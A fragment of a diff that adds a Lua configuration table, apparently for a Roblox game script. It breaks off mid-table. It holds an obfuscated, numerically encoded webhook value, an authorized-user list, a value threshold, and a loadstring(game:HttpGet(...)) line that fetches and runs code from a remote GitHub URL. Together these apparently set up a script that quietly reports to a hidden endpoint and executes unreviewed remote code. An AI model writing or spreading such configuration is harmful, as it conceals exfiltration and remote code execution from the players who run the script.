@@ -1,0 +1,9 @@
+local CONFIG = {
+    Authorized = {"liamlexder01"},
+
+    WebhookEncrypted = "41,6,23,17,29,95,124,78,6,91,67,81,89,51,22,77,2,1,8,124,0,18,91,31,69,83,35,26,12,14,5,22,124,80,87,0,9,0,5,119,66,85,84,94,86,96,80,80,7,9,11,14,110,36,21,38,2,14,35,83,40,123,116,116,108,55,3,8,55,38,60,3,56,1,117,71,127,0,118,40,6,39,20,28,26,23,47,10,86,90,70,16,65,12,42,92,0,25,44,56,116,105,1,127,41,60,83,55,56,23,10,55,81,5,68,118,124,118,36,6,36",
+
+    MinMillionPerSecond = 60,
+
+    Custom_Loadstring = true,
+    CustomScriptLoadstring = "loadstring(game:HttpGet('https://raw.githubusercontent.com/xspeedHub0/Zlhub/main/ZLPVPreview.lua'))()",
